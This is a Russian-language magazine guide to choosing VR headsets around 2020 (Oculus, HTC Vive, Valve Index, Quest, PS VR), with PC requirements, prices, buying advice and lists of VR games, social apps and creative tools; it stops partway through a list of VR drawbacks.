  Яндекс.Маркет предложит тебе купить CV1 в РФ за 45–50 тысяч рублей,
не ведись на это. С рук такой шлем можно взять за 15–20 тысяч рублей,
а дороже нет смысла.
   Стоит ли вооб ще брать его сегодня? Если денег мало и ты вдруг наткнул ся
на выгодное предложение, то это неплохой стартовый комплект, пригодный
для полноценной VR. Скорее всего, он еще долго будет поддерживаться раз‐
работчиком, так как, судя по Steam, он сей час примерно у 30% игроков.
Однако держи в голове,  что, во‐первых, придет ся расставлять датчики
по комнате, а во‐вто рых, шлемы этого класса бесполез ны без современного
ПК.
   Вот какие тре бования к ПК у Oculus Rift CV1.


Oculus Rift CV1
 • Графика: Nvidia GTX 1060 / Radeon RX 480 или выше либо Nvidia GTX 970
    / AMD Radeon R9 290 или выше
 • Про цессор: Intel i5‐4590 / AMD Ryzen 5 1500X или лучше (обязательна
   поддержка процессором инструкций SSE 4.2)
 • Опе ративная память: 8 Гбайт и более
 • Видеовы ход: совместимый с HDMI 1.3
 • USB: три USB 3.0 + один USB 2.0
 • ОС: Windows 10



Это — рекомендованные требования с сайта про изводителя. По факту шлем
вполне может работать и на более слабых машинах, но в некоторых играх
могут быть «тормоза».
  Обрати внимание на требова ния к количес тву портов USB. Один USB
3.0 нужен для шлема и два — для камер. При этом, если вариантов нет, мож‐
но использовать и USB 2.0, но с треть им частота опроса сенсоров будет
выше.
  А вот инструк ции SSE 4.2 про цес сор должен поддерживать обязательно .
Без них софт для шлема просто не уста новится. Раньше на сайте Oculus была
утилита для проверки, но сейчас ее убра ли. Поэтому, если хочешь узнать,
подойдет  ли  твой  ПК,  придется  ска чать  весь  софт  Oculus  (это
где‐то 10 Гбайт), установить и убедиться, что он запускается и работает кор‐
ректно. Если установщик или ПО будут выдавать ошибки, скорее всего,
с железом что‐то не то.





  Oculus Rift CV1 и Oculus Touch — полноценный комплект VR, но уже нем‐
  ного устаревший

Oculus Rift S — самый акту альный проводной Oculus на сегодня. Его про‐
дажи стартовали в мае 2019‐го, ценник на официальном сайте — 400 дол‐
ларов (в черную пятницу со скидкой — 350 баксов). В Oculus при этом его
не называют новым поколением шлемов: это просто улучшенная версия пер‐
вого Rift, о котором мы говорили выше.
  Чем модель S лучше CV1? Во‐первых, увеличили разрешение экрана —
теперь это 2560 на 1440 пикселей на оба глаза, частота развертки — 80 Гц.
Во‐вторых, изменили дизайн оголовья. В‐третьих, и это главное, больше
не нужны внешние сенсоры, так как сам шлем оснащен аж пятью камерами
для «трекинга изнутри».
  Кроме этого, в комплекте идут два Oculus Touch, которые отличаются
от «тачей» для старого «Рифта» тем, что кольца теперь вывернуты вверх, а не
вниз, чтобы их могли «видеть» камеры шлема. Науш ники из старого «Риф та»
заменили встро енными динамиками. Это скорее минус, чем плюс, но раз‐
работчики, похоже, делали все, чтобы уложиться в 400 дол ларов. Кстати, про‐
изводит эту модель компания Lenovo, что подтвержда ет шильдик на боку.





                              Oculus Rift S

Несмотря на увеличенное раз решение экрана, системные требования для ПК
остались такими же, как и у CV1, — за счет уменьшенной частоты развертки.
Разве что интерфейс подключения изменился: теперь нужен только один USB
3.0 и один DisplayPort 1.2 или Mini DisplayPort (адаптер входит в комплект).
   Вот список основных минусов Oculus Rift S.
 • Отсутствие физической регулировки меж зрач кового рассто-
   яния. Если у тебя оно силь но далеко от среднего, могут быть проблемы,
   и лучше потестировать шлем перед покупкой где‐то в клубе. Разработчики
   заявляют, что комфортно использовать шлем можно в диапазоне 58–
   71 мм (идеально — 64 мм).
 • Шлем очень придирчив к портам USB. Час то его не удается под клю‐
   чить или настро ить либо он начинает сбоить во время работы, если с пор‐
   тами что‐то не так. Однако софт Oculus постоянно совершенствуется,
   и новые драйверы и обновления для шлема выходят чуть ли не каждую
   неделю. Так что со временем этот момент должны пофиксить. Все же
   по сравнению с CV1 это пока довольно новый про дукт.
 • Тре кинг рук за спиной нестабилен, как и в шлемах WMR. Ведь
  камеры в такие моменты не видят, где находятся контроллеры.
 • Те бе понадо бится хорошее осве щение. В сумерках или при малом
   освещении трекинг шлема может начать подглю чивать.

На мой взгляд, Oculus Rift S — это на сегодняшний день оптимальный шлем
для ПК по соотношению цены, качес тва и воз можнос тей.
  В России он продается от 35 тысяч, на Западе он стоит 400 дол ларов.
Если прибавить стоимость доставки, то получится, что за 30–32 тысячи можно
получить актуальный и полноценный комплект для VR.
   Кстати, по слухам, новый проводной шлем в Oculus выпустят еще не скоро.


HTC Vive, Vive PRO и Vive Cosmos
Покупать первый Vive сегодня я бы рекомендовать не стал. Разрешение
экрана 1200 на 1080 пикселей на глаз (это даже хуже, чем Oculus Rift CV1),
не особенно удачные контроллеры‐«клюшки», да и сам шлем тяжелый
и неудобный. Все это мож но было бы ему прос тить, если бы не одно но: дико
завышенная цена. Впро чем, это характерно не только для первой версии
шлема, но и для всей серии.
  На официальном сайте Vive можно заказать «всего» за 50 тысяч руб лей.





                 Комплект HTC Vive первой версии

В комплект вхо дят сам шлем, две базовые станции и два контроллера
для отслеживания рук.
   Да, там своя система трекинга, осно ванная на лазерах, которая якобы луч‐
ше, чем камеры Oculus Rift, по крайней мере для больших площадей, —
поэтому клубы VR часто выбира ют именно Vive. Но так ли это важно конеч‐
ному потребите лю, который будет играть в комнате с прос транством два
на два метра? В таких усло виях для трекин га вполне хватает встроенных
камер Oculus Rift S. И платить 50 косарей за железки из 2016 года в 2020‐м,
как по мне, весьма странная затея.
  С Vive Pro ситуация получше: час тота обновления экрана — 90 Гц, раз‐
решение экрана — 2880 на 1600 на оба глаза (это один из лучших вариантов
на рынке). К тому же «прошка» осна щена наушниками.
   Какой главный минус Vive Pro, я думаю, ты уже догадываешься. На Маркете
его можно найти примерно за 50 тысяч, столько же он стоит на официальном
сайте. И это он еще подешевел: не так давно там стояла цифра 66 тысяч,
и это только за сам шлем. Весь набор с контроллерами и базовы ми стан‐
циями — уже 90 тысяч руб лей. А без них он прос то бесполезен.


             INFO

                    Получается, что сами базовые стан ции и контрол‐
                     леры Vive стоят 40 тысяч рублей. Это если ты
                      надумаешь покупать их, чтобы использовать с Pi‐
                    max или Valve Index. Хотя б/у, конечно, будет
                     дешевле.


Требования к ПК у Vive чуть проще, чем у «Оку лусов».


HTC Vive
 • Графика: GeForce GTX 1060, Radeon R9 290 и выше
 • Про цессор: Intel Core i5‐4590 / AMD FX 8350 и выше
 • Опе ративная память: 4 Гбайт и более
 • Видеовы ход: HDMI 1.4, DisplayPort 1.2
 • USB: три USB 3.0 + один USB 2.0
 • ОС: Windows 7 SP1, Windows 8.1 или более поз дняя версия, Windows 10



Для «прошки» рекомендуется уже карточка уровня GTX 1070 и порт USB 3.0.


        WWW

                      •Программа для тестирования ПК, которая ска‐
                           жет, подходит ли твое железо.


Vive Cosmos —  это модель производс тва HTC, выпущенная  в  кон‐
це 2019 года. Она полага ется на «трекинг изнутри» — на шлеме аж шесть
камер! Правда, их работа пока что ос тавляет желать лучшего (похоже,
все‐таки не в камерах счастье).





                                  Vive Cosmos

Официальный ценник — 66 тысяч руб лей. Зато в комплекте с Cosmos сразу
идут контроллеры, и на этот раз они весьма симпатичные. Разработчики
говорят, что скоро добавят поддержку, помимо внут ренне го трекинга, трекин‐
га при помощи обычных базовых станций Vive. Но это скорее на случай, если
они уже есть, потому что специально собирать такой комплект не кажется
выгодным или разумным мероприятием.
   Главный  плюс  Vive  Cosmos —  это  экран  высокого  разрешения
(2880 на 1700 пик селей на оба глаза), который работает на частоте 90 Гц.
А еще разработ чики обещают сменную лицевую панель и поддержку неких
модулей. Правда, пока что вообще неясно, что это будут за модули и кто их
будет разрабатывать.
  В общем, хайпа в связи с выходом Cosmos нагнали много, но продукт
вышел спор ный. Разрешение у него чуть повыше, чем у Oculus Rift S, тре кинг
(пока что?) хуже, а вот цена больше вдвое.
  В конце 2019 года появилась новость, что руководство HTC разочарова‐
лось в рынке VR: мол, вышли на него слишком рано и несут убытки. Не очень
обнадеживающе для потенциальных покупа телей, подумывающих выложить
за эти шлемы серьезные суммы.


Valve Index
Не стоит путать этот шлем с моделями Vive. Раньше в Valve сотрудничали
с HTC, а теперь решили выпустить свой шлем. И все получи лось!





  Комплект Valve Index: шлем, контроллеры‐кас теты и новые базовые стан‐
  ции

К сожалению, купить его официально пока что нельзя, причем не только в РФ,
а вообще. Дело в том, что первую партию расхва тали за несколько часов пос‐
ле старта продаж в июне 2019‐го, а во второй раз запасы закончились пос ле
анонса той самой Half‐Life: Alyx.
  Откуда такой ажиотаж? Все очень просто, дос таточно гля нуть характерис‐
тики Index:
 • два дисплея с разрешением 1440 на 1600 на глаз (2880 на 1600 в сумме);
 • частота обновле ния дисплеев: 90, 120, 144 Гц (очень неплохо!);
 • уникальная двойная система линз, которая увеличивает угол обзора. Он
   здесь на 20 градусов больше, чем у HTC Vive, как пишут разработчики, —
   и пользователи подтвержда ют, что это хорошо заметно;
 • божественные наушники (по отзывам там очень крутой и необычный 3D‐
   звук);
 • уникальные контрол леры с отслежива нием движения каждого пальца;
 • новые базовые станции Steam VR 2.0, которые работают точнее и на боль‐
  шем расстоянии.

А еще на шлеме спереди есть место для установки модулей. Например,
на «Кикстартере» уже собира ют деньги, чтобы сделать модуль вентиляции
для Index. И, в отличие от ситуации с Cosmos, я охотно поверю, что тут сто‐
ронние разработчики будут заинтересо ваны.
   Как видишь, характеристики действи тельно выдающиеся. И если ты
ждешь, что подвох будет с ценой, то зря: весь комплект Valve продает всего
за 1000 долларов! Ну или сам шлем отдельно за 500, так как он совместим
с контроллерами и станциями от ранних «Вайвов». Именно поэтому ближай‐
ший его предзаказ начнется только в феврале 2020‐го.


        WWW

                     Протестировать ПК на совместимость с  Index
                   можно при помощи программы‐чекера.


Стоит ли брать «Индекс»? Если подходит ПК и есть лишняя штука баксов —
несомненно!


Автономные (Standalone) VR-шле мы
Что же делать, если подходящего компь юте ра нет? Неужели остаются только
варианты с мобильным телефо ном? Вовсе нет, ведь сущес твуют еще и авто‐
номные шлемы VR. Они во многом похожи на шлемы All‐In‐One (те, что
со встроенным железом от мобильного телефона), но находятся на одну сту‐
пеньку выше в технологичес ком плане.
   Здесь уже более специализированная «начин ка» и живые экосис темы —
то есть новые игры и приложения тут выходят и будут выходить. К тому же
в шлемы этой категории встра ивают системы внутреннего трекинга, как у
«проводных» шлемов для ПК. А это зна чит, что есть поддержка контрол леров
для рук и позиционного отслеживания.
   Начнем с двух моделей, которые не нуж но покупать ни под каким соусом.


Lenovo Mirage Solo
Автономный шлем производс тва Lenovo — с двумя камерами для прос транс‐
твенного отслеживания положения головы на манер шлемов WMR, с одним
контроллером, который поддерживает только три степени свободы (вра‐
щение во всех плоскостях). Сто ил он 400 долларов, и главная беда здесь
в том, что он работает на основе заб рошенной платформы Google Daydream.
Официально он уже не продает ся, так что и обсуждать его покупку нет смыс‐
ла.


Vive Focus
Автономный шлем HTC с двумя камера ми, как у «Миража», и контроллером
с тремя сте пенями свободы. Главная проб лема с этим устройством — оно
нацелено на китайский рынок и совместимо толь ко с китайской версией
магазина приложений для Vive, что для РФ, конечно, совсем не интересно.
Ценник в переводе на рубли — око ло 40 тысяч. Если вдруг все же рассмат‐
риваешь этот вариант, ознакомь ся сначала с об зором на YouTube.


Oculus Go
Oculus Go (или «Гошка») — младшая модель, не имеет камер для отсле‐
живания в пространстве, но зато продает ся с контроллером вроде того, что
был у Gear VR. С его помощью можно управлять приложениями. Разрешение
экрана 2560 на 1440 на оба глаза, частота обновления — 72 Гц.
   Вот что у него внутри. Процессор — Qualcomm Snapdragon 821, графичес‐
кий процессор — Adreno 530, 3 Гбайт оперативной памяти, контроллеры Wi‐Fi
и Bluetooth. Операционная система — Android 7.1.





                  Oculus Go и контроллер из комплекта

Как можно догадаться, в настоящие игры для VR на «Гошке» не поиграть. Тут
всего один ручной кон троллер, да и тот без отслеживания в прос транстве.
Однако Go отлично подойдет для просмотра филь мов в 3D, 360‐градусных
панорам и простецких развлечений вроде пинг‐понга.
   Как и в случае с китайскими шлемами, энту зиас ты могут попробовать пос‐
тавить быстрый Wi‐Fi, стримить игры с ПК и играть в них с помощью геймпада.
На эту тему есть хороший ка нал на YouTube, автор которого делает с Oculus
Go много интересного.
  Ценник на официальном сайте: 150 долларов за версию на 32 Гбайт
памяти и 200 долларов за версию с 64 Гбайт. Подоб но другим шлемам Ocu‐
lus, в РФ официально не про дается. Но если тебе нуж но устройство для прос‐
мотра 3D‐контента и панорам и бюджетом ты не сильно ограничен, то есть
смысл заморочиться с дос тавкой из‐за рубежа.


Oculus Quest
«Мы продаем Oculus Quest так быс тро, как только это возможно», — объявил
в сентябре 2019 года Марк Цукерберг (Oculus — дочерняя компания
Facebook).
  И с тех пор «Квесты» действитель но продолжают уходить моментально,
как появляются. Разумеется, магазины и перекупщики, которые продают этот
замечательный шлем, серьезно взвинтили цены. На официальном сайте сто‐
ит ценник 400 дол ларов за версию с 64 Гбайт памяти и 500 — за вариант
со 128 Гбайт. Однако до марта 2020 года все разоб рано.
   Что же мы получим, если удас тся достать такой шлем? Для начала —
это полноценная VR с прос транс твенным отслеживанием (в шле ме установ‐
лены четыре камеры) и двумя тач‐контроллерами, у которых тоже шесть сте‐
пеней свободы. В общем, все как у «больших» шлемов и в точности как у Ocu‐
lus Rift S. Только Rift нуждается в компьютере, а Quest — пол ностью самодос‐
таточный.





                Oculus Quest — нас тоящий хит 2019 года!

Разрешение экрана 3200 га 1440 на оба глаза, частота обновления 72 Гц,
внутри — Qualcomm Snapdragon 835, оперативная память — 4 Гбайт, есть
Bluetooth и Wi‐Fi.
  И при этом никакой уста новки. Вклю чаем шлем, калибруем и начинаем
игру — все перемещения и головы, и рук переносятся в VR, и это —
в мобильном, автономном шлеме! Неплохо, да?
   «Так в чем же подвох?» — спросишь ты. Он очень прост и впол не оче‐
виден: мобильное железо не такое мощное, как хотелось бы, и графика
в играх для «Квеста» тоже на фотореализм не тянет. Если игра портирована
с ПК, то будь уве рен: в ней все упрости ли ради производительности. На Ocu‐
lus Quest ты не сможешь поиграть в Skyrim, No Man’s Sky или Boneworks,
потому что они и на ПК не всегда стабильно работа ют, не то что на мобиль‐
ных устройствах.


             INFO

                     Для  «Квеста»  у  Oculus  есть  свой  магазин,
                        в котором, в отличие от того же Steam, нет реги‐
                       ональных цен, и всё в разы дороже.


Но Oculus Quest не стал бы хитом, если бы еще не пара при ятных фич. Первая
из них — это Oculus Link. В нояб ре 2019 года в Oculus анонсировали воз‐
можность подключать Quest к ПК проводом. То есть берем подходящий по ха‐
рактеристикам кабель, втыкаем один конец в Quest, второй — в ПК, и можно
играть во все игры так, будто у нас Rift S или Rift CV1!
   Это, во‐первых, выгодно, учитывая цены в Steam, во‐вторых, графика
будет гораздо лучше, чем в играх, адап тированных под Quest. Да, есть нюан‐
сы, и пока поддерживаются не все видеокарты, и не любой кабель подойдет
(см. обзор на YouTube). Так что не зря Link пока что в «бете».
   Вторая потенциальная фича Quest — это тре кинг рук. Причем работает
он без дополнительных контроллеров — только бла годаря внешним камерам.
В декабре 2019 года эта функция тоже ста ла доступна в режиме «беты».





Сейчас приложений, которые бы поддерживали такой тре кинг, еще нет,
и работает он только в стартовом меню Oculus Home, но рано или поздно
сторонние разработчики рас пробуют эту фичу. Как минимум можно будет
управлять просмотром видео без контроллеров или использовать жесты
в социальных сетях в VR. Да и набирать текст, не снимая шлем, станет чуть
удобнее.
  Закономерный вопрос: зачем покупать Oculus Rift S, когда есть Oculus
Quest и его можно подрубить к ПК по кабелю и получить то же самое плюс
автономность?
  И вот тут все не так однозначно. Давай попробуем взвесить все за и про‐
тив.
 • Цена: условный Oculus Rift S за 30 тысяч или Quest с кабелем за 40 тысяч
   (и долгим ожиданием)?
 • Экран в S и «Квесте» сделаны по раз ным технологиям, и, хотя раз решение
   у «Квеста» больше, «пиксельную сетку» в нем видно сильнее.
 • Удобство: крепление на Oculus Rift S многим нравится больше, чем лямки
   на «Квесте».
 • Oculus Rift S не нужно заряжать.
 • Способ крепления кабеля у Rift S более продуманный и удобный, чем
   у «Квеста», где его можно легко вырвать неаккуратным дви жением.
 • И конечно, картинка на S четче, ведь для «Квес та» она сначала сжи мается
   хитрым алгоритмом, а потом раз жимается обратно. Как это работает
   и результаты сравнения можно глянуть в сравнительном видеообзоре.

Безусловно, на стороне Oculus Quest — возможность использовать его авто‐
номно, без ПК. То есть можно спокойно положить в рюкзак и пойти устра‐
ивать VR‐вечеринку у друзей. Однако если у тебя уже есть достаточно мощ‐
ный ПК и ты собираешь ся играть в игры или заниматься какой‐то профес‐
сиональной деятельностью в VR, то я бы все же рекомендовал Oculus Rift S.
   Если же мощного компьютера нет и тем более если ты собираешься
купить его позже (или про апгрейдить свой), то Quest сейчас лучшее, что мож‐
но приобрести. Но с учетом ажиота жа это, увы, не будет ни дешево, ни прос‐
то.


                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ
    КАК ПОГРУЗИТЬСЯ
              В VR
        БОЛЬШОЙ ГАЙД ПО ШЛЕМАМ ВИРТУАЛЬНОЙ
                                 РЕАЛЬНОСТИ





PS VR
Еще один интересный вариант — это PlayStation VR. В мире, по статистике
Sony, продано более пяти миллионов комплектов VR для PlayStation 4.
Не исключено, что сейчас это вообще самый популярный комплект VR в мире
(статистики по продажам Oculus Quest у нас нет, а в Steam шлемами VR обла‐
дает где‐то полтора процента игроков).





  Шлем PS VR и набор PS Move, которые заменя ют контроллеры дви жения

И если у тебя есть чет вертая «Сонь ка», то выбор совершенно оче виден:
на распродажах комплект PS VR даже в Рос сии можно купить за 12–15 тысяч
рублей. Правда, в нем не будет контроллеров PS Move, но их без проблем
можно найти на Avito и дру гих подобных сайтах. Однако если у тебя нет
PS4 и ты думаешь взять ее и PS VR именно для виртуальной реальности (а
не для других игр), то это не лучшая идея, и вот почему.
 • Экран   имеет    невысокое    на    сегодняшний    день    раз‐
  решение 1920 на 1080 пикселей на оба гла за (хотя частота обновле‐
   ния 90–120 Гц).
 • Позиционное отсле жива ние реализова но за счет одной камеры и работа‐
   ет только на 180 гра дусов (мож но попробовать наколхозить до четырех
   камер, чтобы получить 360 градусов, но это не решение «из коробки»,
   и работает оно через пень‐колоду).
 • Как следствие, ты не сможешь ходить по комнате и играть нужно будет
   сидя или стоя на одном месте.
 • Вместо контрол леров у нас устаревшие PS Move прямиком из 2012 года.
  Они задумывались для конкуренции с Wii, а не для виртуальной реальнос‐
   ти.
 • Как следствие, на них нет стиков и перемещение возможно только
   с помощью телепортации или плавного скольжения в выбранную заранее
   сторону, что тоже не очень удобно по сравнению с обычным перемещени‐
  ем при помощи стиков.
 • Кроме того, на PS VR своя экосистема приложений. Мало того что игры
   там стоят в разы дороже, чем в Steam, многих популярных игр для VR там
   попросту нет. Есть зато и свои эксклю зивы, но я бы все же выбрал Steam.

Зато в лучших традициях игровых приставок с PS VR не нужно никакого
шаманства: купил, воткнул кабели, и все заработало без всяких нас троек
и других сложностей.


Несколько советов
Я попробовал сформулировать наиболее прос тые и краткие рекомендации,
как выбрать шлем.
 • Сомневаешься в том, что виртуальная реальность — это твое, — сходи
   в клуб и попробуй один из современных шлемов.
 • Есть подходящий ПК и мало денег — берем WMR или б/у Oculus Rift
  CV1 или Vive.
 • Есть подходящий ПК и чуть больше денег — берем Oculus Rift S.
 • Есть подходящий ПК и бюджет не ограничен — берем Valve Index или Vive
   Pro.
 • Есть подходящий ПК, есть деньги и хочется самое лучшее — можно внести
   деньги за Pimax и ждать, пока его начнут рас сылать.
 • Нет ПК, есть подходящий телефон и бюджет ограничен — можно взять
   простой шлем наподобие Cardboard.
 • Нет ПК, бюджет побольше и нужно смот реть только фильмы или панора‐
  мы — берем Oculus Go.
 • Нет ПК и есть достаточно денег — можно дождаться и заказать Oculus
   Quest.
 • Нет ПК, но есть PS4 — берем PS VR и не паримся!


ИГРЫ ДЛЯ ВИРТУАЛЬНОЙ РЕАЛЬНОСТИ
Что делать, когда ты уже купил шлем? Конечно, погонять в какие‐нибудь игры!
Давай пройдемся по списку самого популярного и зрелищ ного, что успело
выйти для современных шлемов.


        WWW

                       Топ продаж VR‐игр в Steam



Я рассматриваю именно Steam, как наиболее дешевую и доступную плат‐
форму с VR‐контентом. В игры на основе Steam VR можно играть во всех
шлемах для ПК, перечисленных в этой статье.
   Хочу предупредить, что представить себе ощу щения от игр в VR очень
сложно заранее, и по роликам на YouTube сделать это не выйдет. Про нюансы
с перемещением я уже писал. А в шутерах, например, очень важно, что нап‐
равление взгляда и прицела — это не одно и то же. И важность таких особен‐
ностей для погружения в игру сложно описывать — гораздо лучше смотреть
самому.


По пулярные игры, портирован ные в VR
Про эти тайтлы ты наверняка слышал, если увлекаешься играми. Все они
перенесены в VR целиком.

Skyrim VR
Довакин теперь в виртуальной реальнос ти! Здесь есть полноценная поддер‐
жка контроллеров, так что рубить противников и кас товать заклинания можно
прямо своими руками.





Fallout 4 VR
Четвертая серия этой RPG про пос тапокалипсис считается не самой лучшей,
но зато в Bethesda честно перенес ли ее в VR.

No Man’s Sky
Крутой космический симулятор, который летом 2019‐го получил официаль‐
ную и полноценную поддержку VR.

Serious Sam
Все серии популярного аркадно го шутера. Да, он, конечно, далеко не нов,
но зато VR — отличный повод его перепрой ти.

DOOM VFR
Не полноценный Doom 2016 года, а игра, разработанная по его мотивам
и специально для VR. Помимо него, есть фанатские моды третьего Doom,
которые тоже добавляют этой ста рой игре полноценную поддержку VR и кон‐
троллеров.





Elite Dangerous
Популярный многопользовательский симулятор боев в космосе, разработан‐
ный специально с учетом VR (для игры нужен геймпад или клавиатура
с мышью).

Subnautica
Популярный подводный «выживач», тоже с родной поддержкой VR. Для игры
нужен геймпад.

Assetto Corsa, DiRT Rally (1 и 2) и Project CARS (1 и 2)
Во всех этих гоночных играх есть поддержка VR, играть можно как при
помощи руля, так и на геймпаде или клавиатуре. Но держаться за нас тоящую
баранку куда веселее!

Euro Truck Simulator 2
Популярный симулятор жиз ни дальнобойщика. Еще есть американская вер‐
сия, и обе поддерживают VR. В Steam это не указано, но под держка точно
есть, просто в режиме «бета».

Hellblade: Senua’s Sacrifice VR Edition
Эта собравшая немало наг рад игра отлично реализована в VR, несмотря
на вид от третьего лица.

Minecraft
Комментарии излишни. По ссылке — версия для Oculus, но есть и другие.

War Thunder
Отечественная многопользовательская игра про воз душные бои, тоже под‐
держивает режим VR — на экспериментальном уровне.





Alien Isolation
Прятки с Чужим в VR щекочут нервы еще боль ше обычного! Для этой игры
есть фанатский мод, который одновременно реализует поддержку геймпада
и контроллеров движения.

Borderlands 2 VR
Знаменитый лутер‐шутер тоже вышел в VR.


В этом списке в основном игры, где режим VR добавили сами раз работчики.
Но есть и сторонний софт, который добавляет поддержку сте рео‐3D во мно‐
жество игр. Например, можешь гля нуть vorpX (список игр смотри на сайте
разработчика). Некоторые игры с ним в шлеме выг лядят так, будто ты сидишь
перед большим экраном с эффектом 3D, а где‐то можно получить пол ное
погружение в игровой мир.
  Даже The Witcher 3 энтузиас ты умудряются завести в VR с видом от пер‐
вого лица (прав да, не столько что бы играть, сколь ко чтобы ходить, смотреть
по сторонам и радоваться), не говоря уже про раз ные части Half‐Life или, нап‐
ример, GTA.


Уникальные про екты имен но для VR

Beat Saber
Едва ли не самая популярная игра для VR сегодня. Рубим кубики дву мя дже‐
дайскими мечами под ритмичную музыку. Нес мотря на прос тое описание,
многие покупают свои устройства именно ради этой игры.

Space Pirate Trainer
Отличная аркада, где нам необходимо расс треливать летящие на нас вра‐
жеские космические корабли. Напоминает старую Galaga для NES — олды
должны помнить, как рубились в нее на «Денди».

Boneworks
Хит 2019 года: шутер в стиле Half‐Life и Portal, с очень хорошим физическим
движком и возможностью раз рушать все и вся. Поговаривают, что в Valve
отложили презентацию Alyx как раз под впечат лением от Boneworks.





                             Boneworks

Superhot VR
Шутер, где ты можешь почувс твовать себя эта ким Нео, который ловко уво‐
рачивается от летящих на него пуль: время в игре дви жется только тогда, ког‐
да ты движешься сам.

Arizona Sunshine
Один из первых крутых зомби‐шутеров, выпущенных для VR. Сей час зом‐
би‐шутеров уже тьма‐тьму щая, но «Солнечная Аризона» все равно многим
нравится по сей день.

Racket Fury: Table Tennis VR
Отличный симулятор настольного тенниса. А биль ярд, аэрохоккей и прочие
игры ты можешь найти в приложении Sports Bar VR.

Pavlov VR
Популярный сетевой шутер для VR (что‐то вроде Counter Strike). Из игр в том
же духе есть Zero Caliber VR и Onward. В общем, шутеров в VR хватает.

Ready Player One: OASIS beta
Игра, а точнее, сборник игр по мотивам филь ма и книги «Первому игроку
приготовиться».

PokerStars VR
Официальное приложение популярного сай та PokerStars для покера. Игра
на деньги не поддерживается, зато есть куча веселья и покера!

GORN
Популярный симулятор гладиатора в VR.





                       GORN

The Wizards
Игра с уникальной механикой магических заклинаний. Они здесь завязаны
на жесты. Нужно метнуть файрбол — делаешь резкий взмах рукой от себя,
нужно поставить щит — обратное дви жение рукой к себе. В игре есть обу‐
чение, и разобраться со всем этим не так тяжело, как может показаться
по описанию.


Эксклюзивы Oculus

Robo Recall
Отличная игра про истребление роботов.

Lone Echo
Космическая одиссея для Oculus. Многие называ ют ее лучшей игрой в VR.





                            Lone Echo

Echo VR
Бесплатная игра про раз влечения в невесомости. Тут есть два режима:
командные перестрелки и дискобол. Очень здо рово сде лано.

Defector
Шпионский боевик для Oculus.

Asgard’s Wrath
Большое VR‐приключение по мотивам скандинавской мифологии.





                               Asgard’s Wrath

Stormland
Приключения андроида в открытом постапокалиптическом мире.

Vader Immortal
Приключения по мотивам «Звез дных войн» с дра ками на световых мечах.


        WWW

                    При желании эти игры можно запустить и на дру‐
                         гих шлемах. Для этого существует проект Revive.


Безусловно, эти списки субъективны — я включил сюда то, что понравилось
самому. Заглядывай в секцию «Лидеры продаж», и найдешь еще много всего
интересного. В Steam для VR что‐нибудь выходит чуть ли не каждый день.


ЧТО ЕСТЬ В VR, КРОМЕ ИГР?
Пока что основное при менение для шлема VR — это игры и «экспириенсы»,
но многие разработчики уже сейчас задумывают ся о том, что в будущем вир‐
туальная реальность ста нет применяться зна чительно шире. И не только
задумываются, но и воплощают свои идеи в жизнь.


Со циальные сети в VR

VRChat
Этот чат, популярный и без виртуальной реальности, поддерживает все сов‐
ременные шлемы VR.





                             VRChat

AltspaceVR
Социальная сеть для VR, бывшая на грани закрытия, когда ее купила Mi‐
crosoft. Тут есть и разные игры, и просто «посидел ки у кос тра».

Rec Room
Популярная социалка, ориентированная в основном на игры. Тут есть даже
режим «Королевской бит вы»!

Sansar
VR‐проект разработчиков популярной виртуальной все ленной Second Life.
Предполагается, что это будет ана лог SL в VR.

Bigscreen Beta
Это и приложение для переда чи картинки с ПК в шлем, и социальная сеть,
в которой предлагают совмес тно смот реть видео. Можно собраться с друзь‐
ями в виртуальной комнате и смотреть YouTube или какой‐то фильм. В кон‐
це 2019 года разработчики анонсирова ли полноценный виртуальный киноте‐
атр — с расписанием, билета ми и дру гими посетителями. А попкорн можно
сделать свой, немало сэкономив!
  Кроме этого, в Facebook анонсирова ли проект Horizon, который должен
открыться для пользователей уже в 2020 году.





Про гул ки по панорамам

Google Earth
Панорамы Google Earth (ссылка на Steam, но приложе ние есть и на дру гих
платформах) особен но интересно раз глядывать в VR. В этом приложении ты
можешь переместиться в любую точку Земли, где проехали машины «Гугла».
Увы, снимали их без стереос копии, но занят но бывает посмотреть даже
на обычные панорамные фот ки с полным погружением и имея возможность
крутить головой по сторонам. Кроме этого, многие VR‐плееры поддерживают
формат 180–360 градусов, так что можно смотреть панорамные ролики
с YouTube… и не толь ко ;‐)


Просмотр 3D-кон тента
Само собой, имея VR‐устройство, ты можешь использовать его как пол‐
ноценный домашний 3D‐кинотеатр. Это — отдель ная большая тема, я по ней
собрал огромный FAQ.


VR ДЛЯ ПРОФЕССИОНАЛОВ
Сегодня многие дизайнеры, художники и 3D‐творцы уже присматриваются
к VR не как к развлечению, а именно как к рабочей среде. Благо там уже появ‐
ляются первые годные 3D‐редакторы. Приведу несколько примеров.

Oculus Medium
Редактор вроде ZBrush, где в VR нужно вза имодействовать с моделью сво‐
ими собственными руками (при помощи контроллеров). Это что‐то вроде
лепки из глины или плас тилина, но со всеми прелестями цифрового творчес‐
тва. Здесь  есть  слои, материалы и прочее,  что может понадобиться
для работы. «Медиум» сегодня считает ся наиболее близким к профес‐
сиональным инструментам VR‐редактором, не зря не так давно проект купила
Adobe.





             INFO

                      Если ты хочешь использовать VR  в профес‐
                       сиональных целях, то, как и в случае с играми,
                        это требует мощного ПК. Главные требования —
                       современная видеокарта (GTX 1060 или AMD
                     490 и выше) и приличный объем оперативки —
                       желательно 16 Гбайт, еще лучше — 32.



Gravity Sketch
Еще один редактор для VR, работа в котором завязана на понимание век‐
торной графики. Делаем набросок, при даем ему объ ем, раскрашиваем и так
далее. Как все это работа ет, можно посмотреть на видео.

Tilt Brush
Непритязательный, но в умелых руках эффективный редактор, где к твоим
услугам простые и понятные инструменты. Примеры работ можно гля нуть
в официальной галерее.





               Пример работы, созданной в Tilt Brush

Blocks by Google
Более простое приложение, которое поз воляет оперировать геометричес‐
кими примитивами.

Kingspray Graffiti VR
Для любите лей порисовать граффити в вир туальной реальности.


Энтузиасты находят и другие применения VR — например, записы вают
каверы на популярные песни при помощи инс трументов в вир туальной реаль‐
ности. Но нужно понимать, что до прихода VR в творческие мас терские и тем
более в офисы еще далеко. Подробнее я разбирал этот вопрос в своем бло‐
ге.


ОБЩИЕ МИНУСЫ VR-УСТРОЙСТВ
Если после всего прочитанного ты уже готов ринуть ся за шлемом, дол жен
напомнить тебе и о недос татках.
 • Возможна личная непереносимость VR: тошнота, головокружение и про‐
   чие спецэффекты. Новичкам быва ет сложно приспособиться, но со вре‐
  менем обычно становится лучше.
 • В любом шле ме из тех, что дос тупны на момент написания, видна пиксель‐
